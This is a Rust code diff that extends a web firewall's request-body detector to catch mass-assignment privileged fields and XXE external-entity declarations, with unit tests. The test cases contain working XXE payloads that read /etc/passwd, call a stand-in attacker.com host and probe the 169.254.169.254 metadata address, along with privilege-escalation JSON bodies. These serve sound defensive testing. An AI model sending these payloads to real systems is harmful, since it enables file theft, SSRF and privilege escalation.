@@ -1,8 +1,11 @@
 use aegis_core::pipeline::RequestView;
+use regex::Regex;
+use std::sync::LazyLock;
 
 use super::{Detector, Signal};
 
-/// Body abuse detector: oversize + deep nesting.
+/// Body abuse detector: oversize + deep nesting + privileged-
+/// field abuse (mass assignment) + XXE external-entity probes.
 pub struct BodyAbuseDetector {
     /// Max body size in bytes before flagging.
     pub max_body_bytes: u64,
@@ -18,6 +21,37 @@ impl Default for BodyAbuseDetector {
         }
     }
 }
+
+/// Privileged JSON fields that are never expected from end-user
+/// bodies on non-admin endpoints. The presence of any of these
+/// is a strong mass-assignment / privilege-escalation signal —
+/// legit clients shouldn't ever set their own role, admin flag,
+/// account balance, password hash, or auth token via a profile
+/// PATCH or registration POST.
+///
+/// The match is keyed on the JSON property name to keep false
+/// positives low; nested wrappers are fine ("settings.role"
+/// still matches because the regex looks for `"role"\s*:`).
+static MASS_ASSIGN_KEYS: LazyLock<Regex> = LazyLock::new(|| {
+    // NB: deliberately excludes generic flags like `active` /
+    // `enabled` because they're too common in benign bodies
+    // ("is this product active?", "feature enabled?"). The
+    // included keys are auth/identity/financial — i.e. they're
+    // never expected from an end-user's PATCH body.
+    Regex::new(r#"(?i)"\s*(role|is_admin|is_superuser|isAdmin|superuser|permissions|privileges|grants|balance|account_balance|password_hash|api_key|api_token|access_token|refresh_token|email_verified)\s*"\s*:"#)
+        .expect("mass-assign regex compiles")
+});
+
+/// XXE external-entity declarations. Two ingredients are needed
+/// for an attack: an `<!ENTITY ... SYSTEM "..." ...>` (or PUBLIC)
+/// declaration that resolves to an external resource, and the
+/// entity reference being expanded inside the document. We flag
+/// the declaration; the parser will be the one that exfiltrates
+/// if the upstream is XXE-vulnerable.
+static XXE_ENTITY_DECL: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?is)<!ENTITY\s+[^>]*\b(SYSTEM|PUBLIC)\b"#)
+        .expect("xxe regex compiles")
+});
 
 impl Detector for BodyAbuseDetector {
     fn id(&self) -> &'static str {
@@ -43,6 +77,8 @@ impl Detector for BodyAbuseDetector {
         if !peek.is_empty() {
             if let Ok(text) = std::str::from_utf8(peek) {
                 let trimmed = text.trim_start();
+
+                // 2a. JSON-only checks.
                 if trimmed.starts_with('{') || trimmed.starts_with('[') {
                     let depth = json_nesting_depth(trimmed);
                     if depth > self.max_nesting_depth {
@@ -52,6 +88,29 @@ impl Detector for BodyAbuseDetector {
                             field: "body".into(),
                         });
                     }
+                    // Mass assignment: privileged-field key in body.
+                    if MASS_ASSIGN_KEYS.is_match(text) {
+                        signals.push(Signal {
+                            score: 50,
+                            tag: "mass_assignment".into(),
+                            field: "body".into(),
+                        });
+                    }
+                }
+
+                // 2b. XML-only check — XXE external-entity decl.
+                // Recognises <?xml … ?> prologue OR a leading
+                // root tag, then looks for <!ENTITY … SYSTEM/
+                // PUBLIC anywhere in the peeked window.
+                let looks_xml = trimmed.starts_with("<?xml")
+                    || trimmed.starts_with("<!DOCTYPE")
+                    || (trimmed.starts_with('<') && !trimmed.starts_with("<!--"));
+                if looks_xml && XXE_ENTITY_DECL.is_match(text) {
+                    signals.push(Signal {
+                        score: 60,
+                        tag: "xxe".into(),
+                        field: "body".into(),
+                    });
                 }
             }
         }
@@ -312,4 +371,127 @@ mod tests {
     normal_body!(normal_whitespace_json, "  { \"a\" : 1 } ");
     normal_body!(normal_binary_like, "some random bytes 0xFF 0x00");
     normal_body!(normal_single_val, "42");
+
+    // ---- Positive: mass-assignment privileged-field probes ----
+    macro_rules! mass_assign {
+        ($name:ident, $body:expr) => {
+            #[test]
+            fn $name() {
+                let d = BodyAbuseDetector::default();
+                let body = $body.as_bytes();
+                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
+                let req = view(&m, &u, &h, &b);
+                let signals = d.inspect(&req);
+                assert!(
+                    signals.iter().any(|s| s.tag == "mass_assignment"),
+                    "expected mass_assignment for: {}",
+                    $body,
+                );
+            }
+        };
+    }
+    mass_assign!(ma_role_admin,        r#"{"role":"admin"}"#);
+    mass_assign!(ma_is_admin_true,     r#"{"is_admin":true}"#);
+    mass_assign!(ma_is_admin_camel,    r#"{"isAdmin":true}"#);
+    mass_assign!(ma_is_superuser,      r#"{"is_superuser":true}"#);
+    mass_assign!(ma_superuser_alone,   r#"{"name":"a","superuser":true}"#);
+    mass_assign!(ma_balance,           r#"{"balance":99999999}"#);
+    mass_assign!(ma_account_balance,   r#"{"account_balance":1000}"#);
+    mass_assign!(ma_password_hash,     r#"{"password_hash":"$2b$..."}"#);
+    mass_assign!(ma_api_key,           r#"{"api_key":"sk-..."}"#);
+    mass_assign!(ma_api_token,         r#"{"api_token":"tk-..."}"#);
+    mass_assign!(ma_access_token,      r#"{"access_token":"..."}"#);
+    mass_assign!(ma_refresh_token,     r#"{"refresh_token":"..."}"#);
+    mass_assign!(ma_permissions,       r#"{"permissions":["*"]}"#);
+    mass_assign!(ma_privileges,        r#"{"privileges":["root"]}"#);
+    mass_assign!(ma_grants,            r#"{"grants":["root"]}"#);
+    mass_assign!(ma_email_verified,    r#"{"email_verified":true}"#);
+    mass_assign!(ma_combined_normal,   r#"{"name":"alice","role":"admin"}"#);
+    mass_assign!(ma_with_whitespace,   r#"{ "role" : "admin" }"#);
+    mass_assign!(ma_array_with_role,   r#"[{"name":"a"},{"role":"admin"}]"#);
+    mass_assign!(ma_nested_role,       r#"{"profile":{"role":"admin"}}"#);
+
+    // ---- Negative: bodies that should NOT trip mass-assign ----
+    macro_rules! ma_clean {
+        ($name:ident, $body:expr) => {
+            #[test]
+            fn $name() {
+                let d = BodyAbuseDetector::default();
+                let body = $body.as_bytes();
+                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
+                let req = view(&m, &u, &h, &b);
+                let signals = d.inspect(&req);
+                assert!(
+                    !signals.iter().any(|s| s.tag == "mass_assignment"),
+                    "false positive mass_assignment for: {}",
+                    $body,
+                );
+            }
+        };
+    }
+    ma_clean!(ma_clean_name,           r#"{"name":"alice","email":"a@b.com"}"#);
+    ma_clean!(ma_clean_message,        r#"{"message":"my role is unclear"}"#);
+    ma_clean!(ma_clean_role_substr,    r#"{"description":"accessory rolepoint"}"#);
+    ma_clean!(ma_clean_color,          r#"{"color":"admin","preference":"dark"}"#);
+    ma_clean!(ma_clean_orderitems,     r#"{"items":[{"sku":"x","qty":1}]}"#);
+
+    // ---- Positive: XXE external-entity decls ----
+    macro_rules! xxe {
+        ($name:ident, $body:expr) => {
+            #[test]
+            fn $name() {
+                let d = BodyAbuseDetector::default();
+                let body = $body.as_bytes();
+                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
+                let req = view(&m, &u, &h, &b);
+                let signals = d.inspect(&req);
+                assert!(
+                    signals.iter().any(|s| s.tag == "xxe"),
+                    "expected xxe for: {}",
+                    $body,
+                );
+            }
+        };
+    }
+    xxe!(xxe_classic_etcpasswd,
+        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#);
+    xxe!(xxe_doctype_only,
+        r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#);
+    xxe!(xxe_public_id,
+        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "any" "http://attacker.com/xxe.xml">]><foo>&xxe;</foo>"#);
+    xxe!(xxe_param_entity,
+        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname">%file;]><foo/>"#);
+    xxe!(xxe_with_whitespace,
+        "<?xml version=\"1.0\"?><!DOCTYPE r [\n<!ENTITY  x  SYSTEM  \"file:///etc/passwd\">\n]><r>&x;</r>");
+    xxe!(xxe_no_prologue,
+        r#"<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/">]><r>&x;</r>"#);
+
+    // ---- Negative: clean XML bodies ----
+    macro_rules! xxe_clean {
+        ($name:ident, $body:expr) => {
+            #[test]
+            fn $name() {
+                let d = BodyAbuseDetector::default();
+                let body = $body.as_bytes();
+                let (m, u, h, b) = make_view_with_body(body, Some(body.len() as u64));
+                let req = view(&m, &u, &h, &b);
+                let signals = d.inspect(&req);
+                assert!(
+                    !signals.iter().any(|s| s.tag == "xxe"),
+                    "false positive xxe for: {}",
+                    $body,
+                );
+            }
+        };
+    }
+    xxe_clean!(xxe_clean_simple,
+        r#"<?xml version="1.0"?><root><item>value</item></root>"#);
+    xxe_clean!(xxe_clean_no_doctype,
+        r#"<root><item>v</item></root>"#);
+    xxe_clean!(xxe_clean_doctype_no_entity,
+        r#"<?xml version="1.0"?><!DOCTYPE r SYSTEM "schema.dtd"><r/>"#);
+    // ^ Note: <!DOCTYPE … SYSTEM is a doctype-public-id reference, not
+    // an external-entity declaration; the regex requires <!ENTITY.
+    xxe_clean!(xxe_clean_internal_entity,
+        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY name "value">]><r>&name;</r>"#);
 }
